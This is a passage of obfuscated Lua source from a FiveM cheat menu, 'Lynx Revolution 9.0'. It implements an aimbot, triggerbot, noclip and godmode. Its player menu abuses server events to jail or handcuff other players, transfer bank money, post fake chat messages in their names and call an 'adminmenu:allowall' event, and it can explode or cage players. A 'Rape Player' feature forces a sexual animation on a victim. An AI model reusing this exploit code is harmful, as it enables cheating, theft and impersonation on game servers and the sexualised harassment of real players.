CreateVehicle(GetHashKey(e3), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e3), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e3), 2 * GetEntityCoords(GetPlayerPed(i)) + au, true, true) end end end) end;
    if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
    if IsControlPressed(0, 209) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0) elseif IsControlPressed(0, 210) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0) end end;
    if TriggerBot then local e4, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity) if e4 then
    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then ShootPlayer(Entity) end end end;
    if Aimbot then
    for dj = 1, #aI() do
        if dj ~=
    PlayerId() then
    if IsPlayerFreeAiming(PlayerId()) then local e5 = GetPlayerPed(dj) local e6 = GetEntityCoords(e5) local e7 = DoesEntityExist(e5) local e8 = IsPlayerDead(e5) if e7 and not e8 then local e9, ea, eb = World3dToScreen2d(e6.x, e6.y, e6.z, 0) if IsEntityVisible(e5) and e9 then
    if HasEntityClearLosToEntity(PlayerPedId(), e5, 17) then local ec = GetPedBoneCoords(e5, 31086, 0, 0, 0) SetPedShootsAtCoord(PlayerPedId(), ec.x, ec.y, ec.z, 1) end end end end end end end; DisplayRadar(true) if RainbowVeh then Citizen.Wait(0) local dY = f(1.0) SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dY.r, dY.g, dY.b) SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dY.r, dY.g, dY.b) end;
    if rainbowh then
    for i = -1, 12 do Citizen.Wait(0) local ah = f(1.0) SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i) SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ah.r, ah.g, ah.b) if i ==
    12 then i = -1 end end end;
    if t2x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0) end;
    if t4x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0) end;
    if t10x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0) end;
    if t16x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0) end;
    if txd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0) end;
    if tbxd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0) end;
    if Noclip then local ed = 2; local ee = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) FreezeEntityPosition(PlayerPedId(-1), true) SetEntityInvincible(PlayerPedId(-1), true) local ef = GetEntityCoords(entity) DisableControlAction(0, 32, true) DisableControlAction(0, 268, true) DisableControlAction(0, 31, true) DisableControlAction(0, 269, true) DisableControlAction(0, 33, true) DisableControlAction(0, 266, true) DisableControlAction(0, 34, true) DisableControlAction(0, 30, true) DisableControlAction(0, 267, true) DisableControlAction(0, 35, true) DisableControlAction(0, 44, true) DisableControlAction(0, 20, true) local eg = 0.0; local eh = 0.0;
    if GetInputMode() == "MouseAndKeyboard"
    then
    if IsDisabledControlPressed(0, 32) then eg = 0.5 end;
    if IsDisabledControlPressed(0, 33) then eg = -0.5 end;
    if IsDisabledControlPressed(0, 34) then SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0) end;
    if IsDisabledControlPressed(0, 35) then SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0) end;
    if IsDisabledControlPressed(0, 44) then eh = 0.21 end;
    if IsDisabledControlPressed(0, 20) then eh = -0.21 end end; ef = GetOffsetFromEntityInWorldCoords(ee, 0.0, eg * (ed + 0.3), eh * (ed + 0.3)) local cN = GetEntityHeading(ee) SetEntityVelocity(ee, 0.0, 0.0, 0.0) SetEntityRotation(ee, 0.0, 0.0, 0.0, 0, false) SetEntityHeading(ee, cN) SetEntityCollision(ee, false, false) SetEntityCoordsNoOffset(ee, ef.x, ef.y, ef.z, true, true, true) FreezeEntityPosition(ee, false) SetEntityInvincible(ee, false) SetEntityCollision(ee, true, true) end end end) Citizen.CreateThread(function() FreezeEntityPosition(entity, false) local ei = 1; local ej = false; local ek = nil; local el = nil; local em = nil; local en = 1; local eo = 1; local ep = {
        1.0, 2.0, 4.0, 10.0, 512.0, 9999.0
    }
    e.CreateMenu(bM, bN) e.CreateSubMenu(bO, bM, I) e.CreateSubMenu(bS, bM, I) e.CreateSubMenu(bT, bM, I) e.CreateSubMenu(bU, bM, I) e.CreateSubMenu(bQ, bM, I) e.CreateSubMenu(bV, bM, I) e.CreateSubMenu(bW, bM, I) e.CreateSubMenu(bX, bW, I) e.CreateSubMenu(bY, bU, I) e.CreateSubMenu(bZ, bQ, I) e.CreateSubMenu(cb, bQ, I) e.CreateSubMenu(ca, bQ, I) e.CreateSubMenu(bR, bQ, I) e.CreateSubMenu(c0, bQ, I) e.CreateSubMenu(b_, bM, I) e.CreateSubMenu(co, bX, I) e.CreateSubMenu(c9, bX, I) e.CreateSubMenu(cq, bT, I) e.CreateSubMenu(cp, cq, I) e.CreateSubMenu(cj, cp, I) e.CreateSubMenu(cn, cj, I) e.CreateSubMenu(cm, bV, I) e.CreateSubMenu(ck, cm, I) e.CreateSubMenu(c1, ck, I) e.CreateSubMenu(c2, bV, I) e.CreateSubMenu(c3, c2, I) e.CreateSubMenu(cl, c3, I) e.CreateSubMenu(ch, bW, I) e.CreateSubMenu(c5, bU, I) e.CreateSubMenu(c4, bV, I) e.CreateSubMenu(cg, c4, I) e.CreateSubMenu(cf, c4, I) e.CreateSubMenu(ce, bX, I) e.CreateSubMenu(cd, bV, I) e.CreateSubMenu(cc, c9, I) e.CreateSubMenu(c7, bV, I) e.CreateSubMenu(c6, bU, I) e.CreateSubMenu(c8, bU, I) for i, eq in pairs(bC) do e.CreateSubMenu(eq.id, cg, eq.name) if eq.
    id == "paint"
    then e.CreateSubMenu("primary", eq.id, "Primary Paint") e.CreateSubMenu("secondary", eq.id, "Secondary Paint") e.CreateSubMenu("rimpaint", eq.id, "Wheel Paint") e.CreateSubMenu("classic1", "primary", "Classic Paint") e.CreateSubMenu("metallic1", "primary", "Metallic Paint") e.CreateSubMenu("matte1", "primary", "Matte Paint") e.CreateSubMenu("metal1", "primary", "Metal Paint") e.CreateSubMenu("classic2", "secondary", "Classic Paint") e.CreateSubMenu("metallic2", "secondary", "Metallic Paint") e.CreateSubMenu("matte2", "secondary", "Matte Paint") e.CreateSubMenu("metal2", "secondary", "Metal Paint") e.CreateSubMenu("classic3", "rimpaint", "Classic Paint") e.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") e.CreateSubMenu("matte3", "rimpaint", "Matte Paint") e.CreateSubMenu("metal3", "rimpaint", "Metal Paint") end end;
    for i, eq in pairs(bD) do e.CreateSubMenu(eq.id, cf, eq.name) end;
    local SelectedPlayer;
    while bL do ped = PlayerPedId() veh = GetVehiclePedIsUsing(ped) SetVehicleModKit(veh, 0) for i, eq in pairs(bC) do
        if e.
    IsMenuOpened(cg) then
    if bx then
    if bz == "neon"
    then local r, g, b = table.unpack(by) SetVehicleNeonLightsColour(veh, r, g, b) SetVehicleNeonLightEnabled(veh, 0, bB) SetVehicleNeonLightEnabled(veh, 1, bB) SetVehicleNeonLightEnabled(veh, 2, bB) SetVehicleNeonLightEnabled(veh, 3, bB) bx = false; bz = -1; by = -1 elseif bz == "paint"
    then local er, es, et, eu = table.unpack(by) SetVehicleColours(veh, er, es) SetVehicleExtraColours(veh, et, eu) bx = false; bz = -1; by = -1
    else if bB == "rm"
    then RemoveVehicleMod(veh, bz) bx = false; bz = -1; by = -1
    else SetVehicleMod(veh, bz, by, false) bx = false; bz = -1; by = -1 end end end end;
    if e.IsMenuOpened(eq.id) then
    if eq.id == "wheeltypes"
    then
    if e.Button("Sport Wheels") then SetVehicleWheelType(veh, 0) elseif e.Button("Muscle Wheels") then SetVehicleWheelType(veh, 1) elseif e.Button("Lowrider Wheels") then SetVehicleWheelType(veh, 2) elseif e.Button("SUV Wheels") then SetVehicleWheelType(veh, 3) elseif e.Button("Offroad Wheels") then SetVehicleWheelType(veh, 4) elseif e.Button("Tuner Wheels") then SetVehicleWheelType(veh, 5) elseif e.Button("High End Wheels") then SetVehicleWheelType(veh, 7) end; e.Display() elseif eq.id == "extra"
    then local ev = checkValidVehicleExtras() for i, eq in pairs(ev) do
        if IsVehicleExtraTurnedOn(veh, i)
    then pricestring = "Installed"
    else pricestring = "Not Installed"
    end;
    if e.Button(eq.menuName, pricestring) then SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) end end; e.Display() elseif eq.id == "headlight"
    then
    if e.Button("None") then SetVehicleHeadlightsColour(veh, -1) end;
    for ew, eq in pairs(bF) do tp = GetVehicleHeadlightsColour(veh) if tp ==
    eq.id and not bx then pricetext = "Installed"
    else if bx and tp == eq.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; head = GetVehicleHeadlightsColour(veh) if e.Button(eq.name, pricetext) then
    if not bx then bz = "headlight"
    bB = false; oldhead = GetVehicleHeadlightsColour(veh) by = table.pack(oldhead) SetVehicleHeadlightsColour(veh, eq.id) bx = true elseif bx and head == eq.id then ToggleVehicleMod(veh, 22, true) SetVehicleHeadlightsColour(veh, eq.id) bx = false; bz = -1; by = -1 elseif bx and head ~= eq.id then SetVehicleHeadlightsColour(veh, eq.id) bx = true end end end; e.Display() elseif eq.id == "licence"
    then
    if e.Button("None") then SetVehicleNumberPlateTextIndex(veh, 3) end;
    for ew, eq in pairs(bE) do tp = GetVehicleNumberPlateTextIndex(veh) if tp ==
    eq.id and not bx then pricetext = "Installed"
    else if bx and tp == eq.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; plate = GetVehicleNumberPlateTextIndex(veh) if e.Button(eq.name, pricetext) then
    if not bx then bz = "headlight"
    bB = false; oldhead = GetVehicleNumberPlateTextIndex(veh) by = table.pack(oldhead) SetVehicleNumberPlateTextIndex(veh, eq.id) bx = true elseif bx and plate == eq.id then SetVehicleNumberPlateTextIndex(veh, eq.id) bx = false; bz = -1; by = -1 elseif bx and plate ~= eq.id then SetVehicleNumberPlateTextIndex(veh, eq.id) bx = true end end end; e.Display() elseif eq.id == "neon"
    then
    if e.Button("None") then SetVehicleNeonLightsColour(veh, 255, 255, 255) SetVehicleNeonLightEnabled(veh, 0, false) SetVehicleNeonLightEnabled(veh, 1, false) SetVehicleNeonLightEnabled(veh, 2, false) SetVehicleNeonLightEnabled(veh, 3, false) end;
    for i, eq in pairs(bH) do colorr, colorg, colorb = table.unpack(eq) r, g, b = GetVehicleNeonLightsColour(veh) if colorr ==
    r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not bx then pricestring = "Installed"
    else if bx and colorr == r and colorg == g and colorb == b then pricestring = "Previewing"
    else pricestring = "Not Installed"
    end end;
    if e.Button(i, pricestring) then
    if not bx then bz = "neon"
    bB = IsVehicleNeonLightEnabled(veh, 1) oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) by = table.pack(oldr, oldg, oldb) SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) bx = true elseif bx and colorr == r and colorg == g and colorb == b then SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) bx = false; bz = -1; by = -1 elseif bx and colorr ~= r or colorg ~= g or colorb ~= b then SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) SetVehicleNeonLightEnabled(veh, 0, true) SetVehicleNeonLightEnabled(veh, 1, true) SetVehicleNeonLightEnabled(veh, 2, true) SetVehicleNeonLightEnabled(veh, 3, true) bx = true end end end; e.Display() elseif eq.id == "paint"
    then
    if e.MenuButton("~h~~p~#~s~ Primary Paint", "primary") then elseif e.MenuButton("~h~~p~#~s~ Secondary Paint", "secondary") then elseif e.MenuButton("~h~~p~#~s~ Wheel Paint", "rimpaint") then end; e.Display()
    else local aQ = checkValidVehicleMods(eq.id) for i, ex in pairs(aQ) do
        for ey, ez in pairs(bG) do
            if ey == eq.name and GetVehicleMod(veh, eq.id)  ~= ex.data.realIndex then price = "Not Installed"
    elseif ey == eq.name and bx and GetVehicleMod(veh, eq.id) == ex.data.realIndex then price = "Previewing"
    elseif ey == eq.name and GetVehicleMod(veh, eq.id) == ex.data.realIndex then price = "Installed"
    end end;
    if ex.menuName == "~h~~b~Stock"
    then end;
    if eq.name == "Horns"
    then
    for eA, eB in pairs(bG) do
        if eB ==
    ci - 1 then ex.menuName = eA end end end;
    if ex.menuName == "NULL"
    then ex.menuName = "unknown"
    end;
    if e.Button(ex.menuName) then
    if not bx then bz = eq.id; by = GetVehicleMod(veh, eq.id) bx = true;
    if ex.data.realIndex == -1 then bB = "rm"
    RemoveVehicleMod(veh, ex.data.modid) bx = false; bz = -1; by = -1; bB = false
    else bB = false; SetVehicleMod(veh, eq.id, ex.data.realIndex, false) end elseif bx and GetVehicleMod(veh, eq.id) == ex.data.realIndex then bx = false; bz = -1; by = -1; bB = false;
    if ex.data.realIndex == -1 then RemoveVehicleMod(veh, ex.data.modid)
    else SetVehicleMod(veh, eq.id, ex.data.realIndex, false) end elseif bx and GetVehicleMod(veh, eq.id)  ~= ex.data.realIndex then
    if ex.data.realIndex == -1 then RemoveVehicleMod(veh, ex.data.modid) bx = false; bz = -1; by = -1; bB = false
    else SetVehicleMod(veh, eq.id, ex.data.realIndex, false) bx = true end end end end; e.Display() end end end;
    for i, eq in pairs(bD) do
        if e.
    IsMenuOpened(eq.id) then
    if GetVehicleMod(veh, eq.id) == 0 then pricestock = "Not Installed"
    price1 = "Installed"
    price2 = "Not Installed"
    price3 = "Not Installed"
    price4 = "Not Installed"
    elseif GetVehicleMod(veh, eq.id) == 1 then pricestock = "Not Installed"
    price1 = "Not Installed"
    price2 = "Installed"
    price3 = "Not Installed"
    price4 = "Not Installed"
    elseif GetVehicleMod(veh, eq.id) == 2 then pricestock = "Not Installed"
    price1 = "Not Installed"
    price2 = "Not Installed"
    price3 = "Installed"
    price4 = "Not Installed"
    elseif GetVehicleMod(veh, eq.id) == 3 then pricestock = "Not Installed"
    price1 = "Not Installed"
    price2 = "Not Installed"
    price3 = "Not Installed"
    price4 = "Installed"
    elseif GetVehicleMod(veh, eq.id) == -1 then pricestock = "Installed"
    price1 = "Not Installed"
    price2 = "Not Installed"
    price3 = "Not Installed"
    price4 = "Not Installed"
    end;
    if e.Button("Stock "..eq.name, pricestock) then SetVehicleMod(veh, eq.id, -1) elseif e.Button(eq.name..
        " Upgrade 1", price1) then SetVehicleMod(veh, eq.id, 0) elseif e.Button(eq.name..
        " Upgrade 2", price2) then SetVehicleMod(veh, eq.id, 1) elseif e.Button(eq.name..
        " Upgrade 3", price3) then SetVehicleMod(veh, eq.id, 2) elseif eq.id ~= 13 and eq.id ~= 12 and e.Button(eq.name..
        " Upgrade 4", price4) then SetVehicleMod(veh, eq.id, 3) end; e.Display() end end;
    if e.IsMenuOpened(bM) then cr("~p~Lynx Revolution - 9.0 - "..d, 0.80, 0.9) a5("Welcome back ~p~"..d..
        " ~s~!", 0.5, 0.5) aM("~h~Lynx Revolution - ~g~9~s~.~g~0", true) aM("~u~https://~s~www.lynxmenu.com~u~/", false) if e.MenuButton("~h~~p~#~s~ Self Menu", bO) then elseif e.MenuButton("~h~~p~#~s~ Online Players", bW) then elseif e.MenuButton("~h~~p~#~s~ Teleport Menu", bS) then elseif e.MenuButton("~h~~p~#~s~ Vehicle Menu", bV) then elseif e.MenuButton("~h~~p~#~s~ Weapon Menu", bT) then elseif e.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", bQ) then elseif e.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", bU) then elseif e.MenuButton("~h~~p~# ~y~34ByTe Community", b_) then end; e.Display() elseif e.IsMenuOpened(bO) then a5("Stuff for yourself", 0.58, 0.58) if e.CheckBox("~h~~g~Godmode", Godmode, function(eC) Godmode = eC end) then elseif e.Button("~h~~y~Semi ~g~Godmode") then local eD = "stt_prop_stunt_soccer_ball"
    while not HasModelLoaded(GetHashKey(eD)) do Citizen.Wait(0) RequestModel(GetHashKey(eD)) end;
    local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) SetEntityVisible(eE, 0, 0) AttachEntityToEntity(eE, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) elseif e.CheckBox("~h~~g~Player Visible", dM, function(eC) dM = eC end) then elseif e.Button("~h~~r~Suicide") then SetEntityHealth(PlayerPedId(-1), 0) elseif e.Button("~h~~g~ESX~s~ Revive Yourself~s~") then TriggerEvent("esx_ambulancejob:revive") elseif e.Button("~h~~g~Heal/Revive") then SetEntityHealth(PlayerPedId(-1), 200) elseif e.Button("~h~~b~Give Armour") then SetPedArmour(PlayerPedId(-1), 200) elseif e.CheckBox("~h~Infinite Stamina", InfStamina, function(eC) InfStamina = eC end) then elseif e.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then therm = not therm; bTherm = therm; SetSeethrough(therm) elseif e.CheckBox("~h~Fast Run", fastrun, function(eC) fastrun = eC end) then elseif e.CheckBox("~h~Super Jump", SuperJump, function(eC) SuperJump = eC end) then elseif e.CheckBox("~h~Noclip", Noclip, function(eC) Noclip = eC end) then end; e.Display() elseif e.IsMenuOpened(bW) then a5("All online players here", 0.58, 0.58) for i = 0, 128 do
        if NetworkIsPlayerActive(i)
    and GetPlayerServerId(i)  ~= 0 and e.MenuButton(GetPlayerName(i)..
        " ~p~["..GetPlayerServerId(i)..
        "]~s~ ~y~["..i..
        "]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~h~~r~DEAD"
            or "~h~~g~ALIVE"), 'PlayerOptionsMenu') then SelectedPlayer = i end end; e.Display() elseif e.IsMenuOpened(bX) then a5("Main selected player options", 0.58, 0.58) e.SetSubTitle(bX, "Player Options ["..GetPlayerName(SelectedPlayer)..
        "]") if e.MenuButton("~h~~p~#~s~ ESX Triggers", co) then elseif e.MenuButton("~h~~p~#~s~ VRP Triggers", ce) then elseif e.MenuButton("~h~~p~#~s~ Troll Menu", c9) then elseif e.Button("~h~Spectate", di and "~g~[SPECTATING]") then SpectatePlayer(SelectedPlayer) elseif e.Button("~h~~r~Semi GOD ~s~Player") then local eD = "stt_prop_stunt_soccer_ball"
    while not HasModelLoaded(GetHashKey(eD)) do Citizen.Wait(0) RequestModel(GetHashKey(eD)) end;
    local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) SetEntityVisible(eE, 0, 0) AttachEntityToEntity(eE, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) elseif e.Button("~h~~g~Heal ~s~Player") then local eF = "PICKUP_HEALTH_STANDARD"
    local eG = GetHashKey(eF) local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) CreateAmbientPickup(eG, cM.x, cM.y, cM.z + 1.0, 1, 1, eG, 1, 0) SetPickupRegenerationTime(pickup, 60) elseif e.Button("~h~Teleport To") then
    if dv then local confirm = KeyboardInput("Are you sure? y/n", "", 0) if confirm == "y"
    then local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false) elseif confirm == "n"
    then aM("~h~~b~Operation cancelled~s~.", false)
    else aM("~h~~b~Invalid Confirmation~s~.", true) aM("~h~~b~Operation cancelled~s~.", false) end
    else local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false) end elseif e.CheckBox("~h~Freeze Player", freezeplayer, function(eC) freezeplayer = eC end) then elseif e.MenuButton("~h~~p~#~s~ Give Single Weapon", ch) then elseif e.Button("~h~Give ~r~All Weapons") then
    for i = 1, #bn do GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(bn[i]), 1000, false, false) end elseif e.Button("~h~Remove ~r~All Weapons") then RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true) elseif e.Button("~h~Give ~r~Vehicle") then local ped = GetPlayerPed(SelectedPlayer) local d7 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if d7
    and IsModelValid(d7) and IsModelAVehicle(d7) then RequestModel(d7) while not HasModelLoaded(d7) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(d7), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
    else aM("~b~Model is not valid!", true) end elseif e.Button("~h~Send To ~r~Jail") then TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed") TriggerServerEvent("ljail:jailplayer") elseif e.Button("~h~~g~Evade ~s~From Jail") then local eH = SelectedPlayer; TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(eH), 0, "escaperino") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(eH), 0) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(eH), 0) TriggerServerEvent("js:jailuser", GetPlayerServerId(eH), 0, "escaperino") TriggerServerEvent("ljail:jailplayer") end; e.Display() elseif e.IsMenuOpened(co) then a5("Useful ESX Triggers for player", 0.29, 0.29) if e.Button("~h~~b~Handcuff Player") then TriggerServerEvent('esx_policejob:handcuff', SelectedPlayer) end; e.Display() elseif e.IsMenuOpened(ce) then a5("Useful VRP Triggers for player", 0.21, 0.21) if e.Button("~h~Transfer money from your bank") then local eI = KeyboardInput("Enter amount of money to give", "", 100) local eJ = KeyboardInput("Enter VRP PERMA ID!", "", 100) if eI ~= ""
    then local dZ = GetPlayerServerId(PlayerId()) TriggerEvent("bank:transfer", dZ, GetPlayerServerId(SelectedPlayer), eI) TriggerServerEvent("bank:transfer", eJ, eI) end end; e.Display() elseif e.IsMenuOpened(c9) then a5("~r~Troll ~s~features for player", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Spawn Peds", cc) then elseif e.Button("~h~~r~Fake ~s~Chat Message") then local eK = KeyboardInput("Enter message to send", "", 100) local eL = GetPlayerName(SelectedPlayer) if eK then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eL, {
        0, 0x99, 255
    }, eK) end elseif e.Button("~h~~r~Kick ~s~From Vehicle") then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer)) elseif e.Button("~h~~y~Explode ~s~Vehicle") then
    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
    else aM("~h~~b~Player not in a vehicle~s~.", false) end elseif e.Button("~h~~r~Banana ~p~Party ~y~v2") then local d = CreateObject(-1207431159, 0, 0, 0, true, true, true) local cJ = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true) local cK = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true) AttachEntityToEntity(d, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(cJ, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(cK, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) elseif e.Button("~h~~r~Explode ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true) elseif e.Button("~h~~r~Rape ~s~Player") then RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
        if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true) while not NetworkHasControlOfEntity(veh) do NetworkRequestControlOfEntity(veh) Citizen.Wait(0) end;
    SetEntityAsMissionEntity(veh, true, true) DeleteVehicle(veh) DeleteEntity(veh) end; count = -0.2;
    for b = 1, 3 do local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true)) local cO = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) SetEntityAsMissionEntity(cO, true, true) AttachEntityToEntity(cO, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) ClearPedTasks(GetPlayerPed(SelectedPlayer)) TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetPedKeepTask(cO) TaskPlayAnim(cO, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetEntityInvincible(cO, true) count = count - 0.4 end elseif e.Button("~h~~r~Cage ~s~Player") then x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) local eM = "prop_fnclink_05crnr1"
    local
    eN = GetHashKey(eM) RequestModel(eN) while not HasModelLoaded(eN) do Citizen.Wait(0) end;
    local cH = CreateObject(eN, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false) local cI = CreateObject(eN, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false) SetEntityHeading(cH, -90.0) SetEntityHeading(cI, 90.0) FreezeEntityPosition(cH, true) FreezeEntityPosition(cI, true) elseif e.Button("~h~~r~Hamburgher ~s~Player") then local cB = "xs_prop_hamburgher_wl"
    local cC = GetHashKey(cB) local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) elseif e.Button("~h~~r~Hamburgher ~s~Player Car") then local cB = "xs_prop_hamburgher_wl"
    local cC = GetHashKey(cB) local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) elseif e.Button("~h~~r~Snowball troll ~s~Player") then rotatier = true; x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) local eO = "sr_prop_spec_tube_xxs_01a"
    local eP = GetHashKey(eO) RequestModel(eP) RequestModel(smashhash) while not HasModelLoaded(eP) do Citizen.Wait(0) end;
    local eQ = CreateObject(eP, roundx, roundy, roundz - 5.0, true, true, false) SetEntityRotation(eQ, 0.0, 90.0, 0.0) local eR = -356333586; local eS = "WEAPON_SNOWBALL"
    for i = 0, 10 do local cM = GetEntityCoords(eQ) RequestModel(eR) Citizen.Wait(50) if HasModelLoaded(eR)
